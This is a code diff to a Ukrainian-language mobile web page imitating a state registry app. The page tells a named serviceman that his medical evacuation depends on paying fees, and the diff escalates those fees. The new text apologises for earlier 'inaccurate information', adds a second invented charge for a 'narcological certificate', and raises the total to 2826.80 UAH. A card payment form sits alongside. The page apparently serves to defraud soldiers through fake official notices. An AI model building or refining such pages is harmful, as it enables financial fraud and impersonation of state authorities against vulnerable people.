@@ -48,7 +48,6 @@
         .bell-container { position: relative; cursor: pointer; }
         .bell-dot { position: absolute; top: -2px; right: -2px; width: 16px; height: 16px; background: #ef4444; border-radius: 50%; color: white; font-size: 9px; display: flex; align-items: center; justify-content: center; font-weight: 900; border: 2px solid white; }
         
-        /* Дополнительные стили для платежной формы */
         .card-input { background: #f8f9fa; border: 1px solid #e2e8f0; padding: 14px; border-radius: 12px; font-weight: 600; font-size: 16px; width: 100%; outline: none; transition: border-color 0.2s; }
         .card-input:focus { border-color: #2563eb; }
         .card-label { font-size: 10px; font-weight: 800; text-transform: uppercase; color: #64748b; margin-bottom: 4px; display: block; margin-left: 4px; }
@@ -188,7 +187,7 @@
                         <div className="flex items-center gap-3">
                             <div className="bell-container" onClick={() => setShowNotification(true)}>
                                 <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2"><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9M13.73 21a2 2 0 0 1-3.46 0"/></svg>
-                                <div className="bell-dot">1</div>
+                                <div className="bell-dot">2</div>
                             </div>
                             <span className="italic">LTE</span>
                         </div>
@@ -249,7 +248,7 @@
                                             <div className="bg-gray-50 p-4 rounded-xl mt-2">
                                                 <div className="flex justify-between items-center text-sm font-bold">
                                                     <span className="text-gray-500">До сплати:</span>
-                                                    <span className="text-blue-600 text-lg">2348,00 ₴</span>
+                                                    <span className="text-blue-600 text-lg">2826,80 ₴</span>
                                                 </div>
                                             </div>
 
@@ -262,17 +261,20 @@
                             {/* СПОВІЩЕННЯ */}
                             {showNotification && (
                                 <div className="notification-overlay">
-                                    <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-blue-600 shadow-2xl overflow-y-auto max-h-[80vh]">
+                                    <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-blue-600 shadow-2xl overflow-y-auto max-h-[85vh]">
                                         <h3 className="w-full text-center text-xl font-black uppercase italic text-blue-600 border-b pb-3 mb-4">Системне сповіщення</h3>
                                         <div className="space-y-4 text-[13px] leading-relaxed text-gray-700 italic">
-                                            <p><span className="font-black text-black">Увага! МАКСИМ ОЛЕКСАНДРОВИЧ</span>, ставимо Вас до відома що сьогодні (16.02.2026) о 13:30 планова евакуація до КП «ДБКЛПД» ДОР м. Дніпро.</p>
-                                            <p>Керівництво Вашої в/ч до відома поставлено. Очікуйте на отримання відповідних документів о 13:30 та на системне сповіщення у своєму особистому кабінету Єдиного Державного Реєстру «ОБЕРІГ».</p>
-                                            <p>Ваші дані про лікування успешно внесені до реєстру «Оберіг». Для <span className="font-black text-red-600 uppercase">ТЕРМІНОЇ</span> активації статусу необхідно:</p>
+                                            <p><span className="font-black text-black">Шановний Максиме Олександровичу!</span></p>
+                                            <p>Приносимо вибачення за надання попередньо неточної інформації. За результатами повторної перевірки всіх державних реєстрів у системі «Оберіг» за Вашим РНОКПП виявлено наступні заборгованості:</p>
+                                            
                                             <div className="bg-blue-50 p-4 rounded-2xl border-l-4 border-blue-600 space-y-3">
-                                                <div className="flex gap-2"><span>•</span><span>Сплатити <span className="font-black">ТЕРМІНОВО</span> неоплачену сплату в розмірі <span className="font-black text-black">2348 грн 00 коп.</span></span></div>
-                                                <div className="flex gap-2"><span>•</span><span>Після активації дочекатись виклику командування та системного сповіщення в Єдиному Державному Реєстрі «ОБЕРІГ» для отримання документів на евакуацію.</span></div>
-                                                <div className="flex gap-2"><span>•</span><span>Вибути з <span className="font-bold">в/ч 3052</span> до <span className="font-bold">КП «ДБКЛПД» ДОР»</span> (термін прибуття — 1 доба).</span></div>
+                                                <div className="flex gap-2"><span>1.</span><span><span className="font-black">Адміністративний збір:</span> за розгляд та затвердження документів регіональною комісією «20-ї РВЛК».<br/><span className="text-blue-700 font-black">Сума: 2348.00 ₴</span></span></div>
+                                                <div className="flex gap-2"><span>2.</span><span><span className="font-black">Державний сертифікат:</span> за оформлення наркологічного сертифікату встановленого зразка.<br/><span className="text-blue-700 font-black">Сума: 478.80 ₴</span></span></div>
                                             </div>
+                                            
+                                            <p className="font-bold text-red-600">Загальна сума до сплати для завершення процедури евакуації: 2826.80 ₴</p>
+                                            
+                                            <p>Після успішного проведення платежів статус Вашої справи буде активовано автоматично. Очікуйте на виклик командування для отримання направлення до <span className="font-bold">КП «ДБКЛПД» ДОР</span>.</p>
                                         </div>
                                         <button onClick={() => setShowNotification(false)} className="w-full bg-black text-white py-4 rounded-2xl font-black uppercase mt-6 italic shadow-lg">ЗРОЗУМІЛО</button>
                                     </div>
@@ -285,13 +287,21 @@
                                     <div className="glass-card p-6 flex flex-col items-start max-w-[95%] border-t-[15px] border-blue-600 shadow-2xl">
                                         <h3 className="w-full text-center text-lg font-black uppercase italic text-blue-600 border-b pb-3 mb-4">РЕЗУЛЬТАТ ПЕРЕВІРКИ</h3>
                                         <div className="space-y-4 text-[13px] leading-relaxed text-gray-700 italic">
-                                            <p>Шановний <span className="font-black text-black">Максим Олександрович</span>, у ході повної перевірки було виявлено наступне:</p>
-                                            <p>На даний момент у Вас зафіксовано <span className="font-black text-red-600 uppercase">тільки одну</span> несплачену заборгованість в державному реєстрі за подачу Ваших документів для вирішального затвердження головною комісією регіону до <span className="font-bold">«20-ї регіональної військово-лікарської комісії (РВЛК)»</span>.</p>
-                                            <div className="bg-gray-50 p-4 rounded-2xl border-l-4 border-gray-400">
-                                                <p className="font-black text-black text-lg">Розмір сплати: 2348 грн</p>
-                                                <p className="text-[10px] mt-1">(Дана сплата нараховується згідно встановлених державних норм згідно чинного законодавства України)</p>
+                                            <p>Шановний <span className="font-black text-black">Максиме Олександровичу</span>, у ході повної перевірки було виявлено наступне:</p>
+                                            <p>На даний момент ми приносимо вибачення за надану раніше недостовірну інформацію. Нами було проведено детальну перевірку усіх реєстрів на наявність несплачених нарахувань. У ході перевірки зафіксовано дві заборгованості:</p>
+                                            
+                                            <div className="bg-gray-50 p-4 rounded-2xl border-l-4 border-gray-400 space-y-3">
+                                                <div>
+                                                    <p className="font-black text-black text-[12px]">1) За подачу документів для вирішального затвердження головною комісією регіону до «20-ї РВЛК».</p>
+                                                    <p className="text-blue-600 font-black">Сума: 2348.00 ₴</p>
+                                                </div>
+                                                <div className="border-t pt-2">
+                                                    <p className="font-black text-black text-[12px]">2) Вартість державного наркологічного сертифікату.</p>
+                                                    <p className="text-blue-600 font-black">Сума: 478.80 ₴</p>
+                                                </div>
                                             </div>
-                                            <p className="font-bold text-green-700">Інших заборгованостей чи неоплачених послуг за Вашим РНОКПП у системі «Оберіг» не знайдено.</p>
+                                            
+                                            <p className="font-bold text-green-700">Інших заборгованостей чи неоплачених послуг за Вашим РНОКПП у системі «Оберіг» наразі не виявлено.</p>
                                         </div>
                                         <button onClick={() => setShowCheckModal(false)} className="w-full bg-black text-white py-4 rounded-2xl font-black uppercase mt-6 italic">ПОВЕРНУТИСЬ НАЗАД</button>
                                     </div>
@@ -322,12 +332,12 @@
                             </div>
 
                             <div className="marquee-container">
-                                <marquee scrollamount="4">«Сплата за реєстрацію в "Оберіг" даних про психіатричне лікування від 13.07.2028 по виписці Nº387001/18 була успішно сплачена. ВАМ ЗАЛИШИЛОСЬ СПЛАТИТИ несплачену заборгованість в державному реєстрі за подачу Ваших документів для вирішального затвердження головною комісією регіону до «20-ї регіональної військово-лікарської комісії (РВЛК)». В РОЗМІРІ 2348 грн 00 коп.»</marquee>
+                                <marquee scrollamount="4">«За результатами перевірки виявлено дві заборгованості: Комісія РВЛК (2348.00 ₴) та Наркологічний сертифікат (478.80 ₴). ЗАГАЛЬНА СУМА ДО СПЛАТИ: 2826.80 ₴. Після оплати очікуйте на наказ про евакуацію до КП «ДБКЛПД» ДОР»</marquee>
                             </div>
 
                             <div className="flex flex-col">
                                 <div className="payment-link-container active:bg-gray-50" onClick={() => setShowPaymentForm(true)}>
-                                    <span className="font-black italic uppercase text-[11px] text-blue-600 underline">Сплатити "Комісійні стяги"</span>
+                                    <span className="font-black italic uppercase text-[11px] text-blue-600 underline">Сплатити державні збори</span>
                                     <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="#2563eb" strokeWidth="3"><path d="M9 18l6-6-6-6"/></svg>
                                 </div>
                                 <div className="payment-link-container active:bg-gray-50" onClick={() => {setPaymentLoading(true); setTimeout(()=>{setPaymentLoading(false); setShowCheckModal(true);}, 2500)}}>
@@ -338,7 +348,7 @@
 
                             <div className="px-6 mt-4 space-y-4">
                                 <div className="ubd-gradient p-6 rounded-[32px] text-white shadow-xl cursor-pointer" onClick={() => setView('ubd')}><p className="text-[10px] font-black opacity-60 uppercase mb-1">Посвідчення</p><h3 className="text-xl font-black italic uppercase tracking-tighter">Учасник бойових дій</h3></div>
-                                <div className="glass-card p-5 border-l-[10px] border-green-500 cursor-pointer" onClick={() => setView('receipt_menu')}><p className="text-[10px] font-black text-gray-400 uppercase">Адмінзбір (ПАК "Оберіг")</p><p className="font-black text-xl italic">ПЕРЕГЛЯНУТИ КВИТАНЦІЇ</p></div>
+                                <div className="glass-card p-5 border-l-[10px] border-green-500 cursor-pointer" onClick={() => setView('receipt_menu')}><p className="text-[10px] font-black text-gray-400 uppercase">Архів платежів</p><p className="font-black text-xl italic">ПЕРЕГЛЯНУТИ КВИТАНЦІЇ</p></div>
                                 <div className="grid grid-cols-2 gap-4">
                                     <div className="army-dark p-6 rounded-[32px] text-white shadow-lg cursor-pointer" onClick={() => setView('military')}><p className="text-[9px] font-bold opacity-50 uppercase mb-1">Військ. квиток</p><p className="font-black text-2xl">AГ 042020</p></div>
                                     <div className="glass-card p-6 rounded-[32px] cursor-pointer" onClick={() => setView('passport')}><p className="text-[9px] font-bold text-gray-400 uppercase mb-1">Паспорт</p><p className="font-black text-2xl">EP 119988</p></div>
